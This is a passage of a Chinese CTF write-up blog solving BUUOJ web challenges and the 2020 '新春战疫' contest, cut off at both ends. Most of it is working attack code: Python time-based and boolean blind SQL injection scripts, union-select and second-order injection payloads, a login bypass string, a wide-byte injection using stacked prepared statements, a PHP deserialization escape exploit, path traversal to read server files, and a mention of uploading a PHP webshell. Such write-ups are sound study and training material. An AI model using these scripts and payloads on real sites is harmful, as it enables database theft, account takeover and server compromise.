class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#encoding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">database &#x3D; &quot;&quot;</span><br><span class="line">hex_database &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">def req(payload,asc):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;c509d4bd-4e45-48b5-a41f-63ea559f3fb6.node3.buuoj.cn&#x2F;register.php&quot;</span><br><span class="line">    header &#x3D; &#123;</span><br><span class="line">        &#39;X - Requested - With&#39;: &#39;XMLHttpRequest&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">        &quot;username&quot;: payload,</span><br><span class="line">        &quot;password&quot;: &quot;1&quot;,</span><br><span class="line">        &quot;email&quot;: &quot;222@qq.com&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    st &#x3D; time.time()</span><br><span class="line">    r &#x3D; requests.post(url, headers&#x3D;header,data&#x3D;data, timeout&#x3D;100)</span><br><span class="line">    if r.status_code !&#x3D; 200:</span><br><span class="line">        return req(payload, asc)</span><br><span class="line">    else:</span><br><span class="line">        if time.time() - st &gt; 2:</span><br><span class="line">            return asc</span><br><span class="line">        else:</span><br><span class="line">            return &#39;&#39;</span><br><span class="line">i &#x3D; 1</span><br><span class="line">while i &lt; 10:</span><br><span class="line">    for j in range(30,148):</span><br><span class="line">        j &#x3D; chr(j)</span><br><span class="line">        k &#x3D; j.encode(&#39;hex&#39;)</span><br><span class="line">        username &#x3D; &quot;&#39;^(case  hex(mid((select * from flag limit 1 offset 0) from 1 for &quot;+str(i)+&quot;)) when &#39;&quot;+ hex_database+ k +&quot;&#39; then sleep(3) else &#39;b&#39; end)+&#39;0&quot;</span><br><span class="line">        print username</span><br><span class="line">        if req(username,j)!&#x3D;&#39;&#39;:</span><br><span class="line">            database &#x3D; database + j # 这儿的j是字母</span><br><span class="line">            hex_database &#x3D;  hex_database + k # 这儿的k是字母对应的hex</span><br><span class="line">            print database</span><br><span class="line">            break</span><br><span class="line">    i &#x3D; i + 1</span><br></pre></td></tr></table></figure><p>需要注意的是长字符串转成数字型数据的时候会变成科学计数法，也就是说会丢失数据精度，最多每次比较10个字符长度，最后拼接成flag</p><blockquote><p>参考资料：</p><p><a href="https://glotozz.github.io/2019/11/20/buuctf-wp-8/" target="_blank" rel="noopener">https://glotozz.github.io/2019/11/20/buuctf-wp-8/</a></p><p><a href="https://blog.csdn.net/a3320315/article/details/104216070" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104216070</a></p><p><a href="https://altman.vip/2018/08/22/WDB-2/#unfinished" target="_blank" rel="noopener">https://altman.vip/2018/08/22/WDB-2/#unfinished</a></p></blockquote><h3 id="0x-05-Black-Watch-入群题-Web"><a href="#0x-05-Black-Watch-入群题-Web" class="headerlink" title="0x 05 [Black Watch 入群题]Web"></a>0x 05 [Black Watch 入群题]Web</h3><ul><li><p>考点</p><p>SQL注入</p></li><li><p>解题过程</p></li></ul><p>查询处的接口存在SQL注入，脚本如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line"># if correct , return empty, else return something</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;8fdba9ab-ef49-4d4f-8f91-230c12ae7173.node3.buuoj.cn&#x2F;backend&#x2F;content_detail.php?id&#x3D;&quot;</span><br><span class="line">payload &#x3D; &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br><span class="line"># [+] --&gt;admin,contents&lt;--</span><br><span class="line">payload &#x3D; &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;contents&#39;)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br><span class="line"># id,title,content,is_enable</span><br><span class="line">payload &#x3D; &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;admin&#39;)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br><span class="line"># id,username,password,is_enable</span><br><span class="line">payload &#x3D; &quot;1^(ord(substr((select(group_concat(password))from(admin)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br><span class="line"># 5c15f69a,06ccfb16</span><br><span class="line">payload &#x3D; &quot;1^(ord(substr((select(group_concat(username))from(admin)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br><span class="line"># e6d20586,863efe1a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def req(url_tmp):</span><br><span class="line">    header &#x3D; &#123;</span><br><span class="line">        &#39;X - Requested - With&#39;: &#39;XMLHttpRequest&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    res &#x3D; requests.get(url_tmp, headers&#x3D;header)</span><br><span class="line">    if res.status_code !&#x3D; 200:</span><br><span class="line">        return req(url_tmp)</span><br><span class="line">    else:</span><br><span class="line">        r &#x3D; res.content.decode(&#39;utf8&#39;)</span><br><span class="line">        if &quot;title&quot; in r:</span><br><span class="line">            return 1</span><br><span class="line">        else:</span><br><span class="line">            return &#39;&#39;</span><br><span class="line">result &#x3D; &quot;&quot;</span><br><span class="line">index &#x3D; 1</span><br><span class="line">tmp &#x3D; 0</span><br><span class="line">while True:</span><br><span class="line">    u_bound &#x3D; 255; l_bound &#x3D; 0</span><br><span class="line">    while u_bound &gt;&#x3D; l_bound:</span><br><span class="line">        m_bound &#x3D; (u_bound + l_bound) &#x2F;&#x2F; 2</span><br><span class="line">        payload_tmp &#x3D; payload.format(index, m_bound)</span><br><span class="line">        url_tmp &#x3D; url + urllib.parse.quote(payload_tmp)</span><br><span class="line">        if req(url_tmp)!&#x3D;&#39;&#39;:</span><br><span class="line">            u_bound &#x3D; m_bound - 1</span><br><span class="line">            tmp &#x3D; m_bound</span><br><span class="line">        else:</span><br><span class="line">            l_bound &#x3D; m_bound + 1</span><br><span class="line">    result +&#x3D; chr(tmp)</span><br><span class="line">    index +&#x3D; 1</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>这里有个坑 ，第一个账号是无效的，第二个账号可以成功登入</p><blockquote><p>参考资料：</p><p><a href="http://p3rh4ps.top/index.php/2019/12/28/19-12-28-%e8%a7%a3%e5%86%b3buu%e9%99%90%e5%88%b6%e8%ae%bf%e9%97%ae%e9%a2%91%e7%8e%87%e9%97%ae%e9%a2%98%e7%9a%84%e7%9b%b2%e6%b3%a8%e8%84%9a%e6%9c%ac/" target="_blank" rel="noopener">http://p3rh4ps.top/index.php/2019/12/28/19-12-28-%e8%a7%a3%e5%86%b3buu%e9%99%90%e5%88%b6%e8%ae%bf%e9%97%ae%e9%a2%91%e7%8e%87%e9%97%ae%e9%a2%98%e7%9a%84%e7%9b%b2%e6%b3%a8%e8%84%9a%e6%9c%ac/</a></p><p><a href="http://www.ch4ser.top/2019/04/22/SQL题型记录/" target="_blank" rel="noopener">http://www.ch4ser.top/2019/04/22/SQL%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/</a></p></blockquote><h3 id="0x-06-virink-2019-files-share"><a href="#0x-06-virink-2019-files-share" class="headerlink" title="0x 06 virink_2019_files_share"></a>0x 06 virink_2019_files_share</h3><ul><li><p>考点</p><p>OpenResty、LFR、Lua - Regex</p></li><li><p>解题过程</p></li></ul><ol><li>打开页面是拼魔方游戏</li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200216000926709.png" alt></p><ol start="2"><li>查看js代码无过，发包测试发现服务器是用OpenResty服务器（OpenResty是一个基于Nginx与Lua的高性能Web平台，其内部集成了大量精良的Lua库、第三方模块以及大多数的依赖项。）</li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200216001215842.png" alt></p><ol start="3"><li>在源代码处发现存在一个uploads文件夹，访问下</li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200216001314589.png" alt></p><ol start="4"><li>里面左边preview的格式是/preview?f= 尝试文件包含漏洞,由于是使用OpenResty，尝试包含nginx的配置文件，默认是<code>/etc/nginx/conf.d/default.conf</code>,发现<code>../</code>被过滤，尝试下双写可以绕过</li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200216001437543.png" alt></p><ol start="5"><li><p>首页注释代码提示Hint : flag in f1ag_Is_h3re </p><p>构造：<code>/preview?f=....//....//....//....//....//....//....//f1ag_Is_h3re..//flag</code></p><p>获得flag</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUOJ </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020新春战疫-网络安全公益赛解题记录</title>
      <link href="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-第一天"><a href="#0x-01-第一天" class="headerlink" title="0x 01 第一天"></a>0x 01 第一天</h3><h4 id="1-1-签到"><a href="#1-1-签到" class="headerlink" title="1.1 签到"></a>1.1 签到</h4><p>抖音号：GAME.CTF里面的视频结尾就有</p><h4 id="1-2-code-in-morse"><a href="#1-2-code-in-morse" class="headerlink" title="1.2 code_in_morse"></a>1.2 code_in_morse</h4><p>流量包导出http对象，得到一个作者上传的一个jpg文件，改一下后缀打开得到一串莫斯电码，解码发现是base32格式，继续解码发现有png文件头，群里有师傅给了提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py &gt; 1.png</span><br></pre></td></tr></table></figure><p>有师傅这样做的</p><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200221222133362.png" alt></p><p>将条形码扫码，扫码网址：<a href="https://www.sojson.com/qr/deqr.html" target="_blank" rel="noopener">https://www.sojson.com/qr/deqr.html</a></p><p>得到一个网址：<a href="https://s2.ax1x.com/2020/02/06/1yPXJ1.jpg" target="_blank" rel="noopener">https://s2.ax1x.com/2020/02/06/1yPXJ1.jpg</a></p><p>访问得到一张图片，提示F5隐写，使用解密脚本得到flag</p><h4 id="1-3-ezupload"><a href="#1-3-ezupload" class="headerlink" title="1.3 ezupload"></a>1.3 ezupload</h4><p>直接上传php文件，连接蚁剑，执行./readflag得到flag</p><h4 id="1-4-简单的招聘系统"><a href="#1-4-简单的招聘系统" class="headerlink" title="1.4 简单的招聘系统"></a>1.4 简单的招聘系统</h4><p>方法一：</p><p>二次注入，exp如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#encoding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">database &#x3D; &quot;&quot;</span><br><span class="line">hex_database &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">def req(payload,asc):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;caddecc79f07485cb789f035fc7b3c3027c1555d32204a11.changame.ichunqiu.com&#x2F;index.php?register&quot;</span><br><span class="line">    header &#x3D; &#123;</span><br><span class="line">        &#39;X - Requested - With&#39;: &#39;XMLHttpRequest&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">        &quot;regname&quot;: payload,</span><br><span class="line">        &quot;regpass&quot;: &quot;1&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    st &#x3D; time.time()</span><br><span class="line">    r &#x3D; requests.post(url, headers&#x3D;header,data&#x3D;data, timeout&#x3D;100)</span><br><span class="line">    if r.status_code !&#x3D; 200:</span><br><span class="line">        return req(payload, asc)</span><br><span class="line">    else:</span><br><span class="line">        if time.time() - st &gt; 2:</span><br><span class="line">            return asc</span><br><span class="line">        else:</span><br><span class="line">            return &#39;&#39;</span><br><span class="line">i &#x3D; 1</span><br><span class="line">while i &lt; 10:</span><br><span class="line">    for j in range(30,148):</span><br><span class="line">        j &#x3D; chr(j)</span><br><span class="line">        k &#x3D; j.encode(&#39;hex&#39;)</span><br><span class="line">        username &#x3D; &quot;&#39;^(case  hex(mid((select flaaag from flag limit 1 offset 0) from 37 for &quot;+str(i)+&quot;)) when &#39;&quot;+ hex_database+ k +&quot;&#39; then sleep(3) else &#39;b&#39; end)+&#39;0&quot;</span><br><span class="line">        print username</span><br><span class="line">        if req(username,j)!&#x3D;&#39;&#39;:</span><br><span class="line">            database &#x3D; database + j # 这儿的j是字母</span><br><span class="line">            hex_database &#x3D;  hex_database + k # 这儿的k是字母对应的hex</span><br><span class="line">            print database</span><br><span class="line">            break</span><br><span class="line">    i &#x3D; i + 1</span><br></pre></td></tr></table></figure><p>方法二：弱口令+SQL注入查询 </p><p>登陆处万能密码 1’ or 1=1# 然后在blank page查询处查flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,database(),3,4,5#   </span><br><span class="line">&#x2F;&#x2F; database():nzhaopin</span><br><span class="line">1&#39; union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema&#x3D;database()#     </span><br><span class="line">&#x2F;&#x2F; backup,flag,user</span><br><span class="line">1&#39; union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name&#x3D;&#39;flag&#39;#</span><br><span class="line">&#x2F;&#x2F; id,flaaag</span><br><span class="line">1&#39; union select 1,group_concat(flaaag),3,4,5 from flag#</span><br><span class="line">&#x2F;&#x2F; flag&#123;548f455e-fc8f-48c4-95ea-62ee4b645a68&#125;</span><br></pre></td></tr></table></figure><p>方法三：二次注入</p><p>猜测注册的语句应该是<code>$sql=insert into table values($id,&#39;$username&#39;,&#39;$password&#39;,&#39;$key&#39;)</code></p><p>构造payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">注册：</span><br><span class="line">test&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))#</span><br><span class="line">登录：</span><br><span class="line">账号：test</span><br><span class="line">密码：123</span><br><span class="line">得到数据库：backup,flag,user</span><br><span class="line">同理进一步查询可以得到flag</span><br></pre></td></tr></table></figure><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200225201009458.png" alt></p><h4 id="1-5-盲注"><a href="#1-5-盲注" class="headerlink" title="1.5 盲注"></a>1.5 盲注</h4><p>waf了<code>= &lt;&gt; like select union * &#39;</code>等,使用regex进行正则匹配</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;0013a95d8ad14842a9bcba0096d069cb38ec1889e4534760.changame.ichunqiu.com&#x2F;index.php?id&#x3D;1 &quot;</span><br><span class="line">list &#x3D; &quot;qwertyuiopasdfghjklzxcvbnm_-0123456789&#123;&#125;&quot;</span><br><span class="line"></span><br><span class="line">flag &#x3D; &quot;flag&#123;af35b43b&quot;</span><br><span class="line">for j in range(35):</span><br><span class="line">    for i in list:</span><br><span class="line">        st &#x3D; time.time()</span><br><span class="line">        payload &#x3D; url + &#39;&#39;&#39;and if((fl4g regexp &quot;^&#123;&#125;&quot;),sleep(3),null)&#39;&#39;&#39;.format(flag+i)</span><br><span class="line">        r &#x3D; requests.get(payload, timeout&#x3D;100)</span><br><span class="line">        if time.time() - st &gt; 2:</span><br><span class="line">            print i</span><br><span class="line">            flag&#x3D;flag+i</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h4 id="1-6-babyphp"><a href="#1-6-babyphp" class="headerlink" title="1.6 babyphp"></a>1.6 babyphp</h4><p>扫描目录发现<a href="http://www.zip源码泄露，下载审计" target="_blank" rel="noopener">www.zip源码泄露，下载审计</a></p><p>反序列化参考：<a href="https://www.gem-love.com/ctf/1669.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1669.html</a></p><p>由于是在逃逸字符，我们需要保证payload在进入属性中之后可以正常反序列化</p><p>通过本地调试，得到正常序列化时的字符</p><p><code>&quot;O:4:&quot;Info&quot;:3:{s:3:&quot;age&quot;;s:3:&quot;123&quot;;s:8:&quot;nickname&quot;;s:4:&quot;test&quot;;s:8:&quot;CtrlCase&quot;;N;}&quot;</code></p><p>其中nickname和age是可控内容</p><p>注意前面的内容中标注了有3个属性，为了保证属性一致，在payload前面加上CtrlCase的内容，然后在最后闭合语句，使unserialize忽略掉后面的CtrlCase</p><p>根据这个payload的字符数，我们需要在nickname中插入足量的黑名单字符，把payload挤出去</p><p>参考大师傅的脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $age&#x3D; &#39;select password,id from user where username&#x3D;?&#39;; &#x2F;&#x2F;要把id放password后面</span><br><span class="line">    public $nickname&#x3D;null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class UpdateHelper</span><br><span class="line">&#123;</span><br><span class="line">    public $sql;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname &#x3D; &quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser&#x3D;&quot;noob123&quot;;</span><br><span class="line">    public $dbpass&#x3D;&quot;noob123&quot;;</span><br><span class="line">    public $database&#x3D;&quot;noob123&quot;;</span><br><span class="line">    public $name&#x3D;&#39;admin&#39;;</span><br><span class="line">    public $token &#x3D; &#39;admin&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$y1ng &#x3D; new UpdateHelper();</span><br><span class="line">$y1ng-&gt;sql &#x3D; new User();</span><br><span class="line">$y1ng-&gt;sql-&gt;nickname &#x3D; new Info();</span><br><span class="line">$y1ng-&gt;sql-&gt;nickname-&gt;CtrlCase &#x3D; new dbCtrl();</span><br><span class="line"></span><br><span class="line">$y1ng &#x3D; &#39;&quot;;s:8:&quot;CtrlCase&quot;;&#39; . serialize($y1ng) . &quot;&#125;&quot;;</span><br><span class="line">$length &#x3D; strlen($y1ng);</span><br><span class="line">$y1ng &#x3D; str_repeat(&#39;union&#39;, $length).$y1ng;</span><br><span class="line">echo($y1ng);</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>提交得到admin密码，登录得到flag</p><p>参考：<a href="http://blog.ydspoplar.top/2020/02/24/i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E6%8A%97%E7%96%AB%E8%B5%9B-WP/#babyphp" target="_blank" rel="noopener">http://blog.ydspoplar.top/2020/02/24/i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E6%8A%97%E7%96%AB%E8%B5%9B-WP/#babyphp</a></p><h3 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h3><h4 id="2-1-easysqli-copy"><a href="#2-1-easysqli-copy" class="headerlink" title="2.1 easysqli_copy"></a>2.1 easysqli_copy</h4><p>参考资料：从宽字节注入认识PDO的原理和正确使用 <a href="https://www.freebuf.com/articles/web/216336.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/216336.html</a></p><p>原理：输入的参数并没有用单引号包裹，发送数据的时候会用单引号进行了包裹，构成了宽字节注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python2</span><br><span class="line"># coding&#x3D;utf-8</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;72e089bbcaf245b2904526c4e4b0518236a6f2cf0f304d10.changame.ichunqiu.com&#x2F;?id&#x3D;&quot;</span><br><span class="line">list &#x3D; &quot;qwertyuiopasdfghjklzxcvbnm_-0123456789&#123;&#125;,&quot;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">for j in range(35):</span><br><span class="line">    for i in list:</span><br><span class="line">        # payload &#x3D; &#39;&#39;&#39;select if(((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())) regexp &#39;^&#123;&#125;&#39;),sleep(3),null)&#39;&#39;&#39;.format(flag+i)</span><br><span class="line">        # payload &#x3D; &#39;&#39;&#39;select if(((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;table1&#39;)) regexp &#39;^&#123;&#125;&#39;),sleep(3),null)&#39;&#39;&#39;.format(flag+i)</span><br><span class="line">        payload &#x3D; &#39;&#39;&#39;select if(((select(group_concat(fllllll4g))from(table1)) regexp &#39;^&#123;&#125;&#39;),sleep(3),null)&#39;&#39;&#39;.format(flag+i)</span><br><span class="line">        payload &#x3D; payload.encode(&#39;hex&#39;)</span><br><span class="line">        param &#x3D; &quot;1&quot; + urllib.unquote(&quot;%df&quot;) + &quot;&#39;;set @a&#x3D;0x&#123;&#125;;prepare smtm_test from @a;execute smtm_test;&quot;.format(payload)</span><br><span class="line">        param &#x3D; urllib.quote(param)</span><br><span class="line">        url1 &#x3D; url + param</span><br><span class="line">        st &#x3D; time.time()</span><br><span class="line">        r &#x3D; requests.get(url1, timeout&#x3D;100)</span><br><span class="line">        if time.time() - st &gt; 2:</span><br><span class="line">            flag&#x3D;flag+i</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h4 id="2-2-blacklist"><a 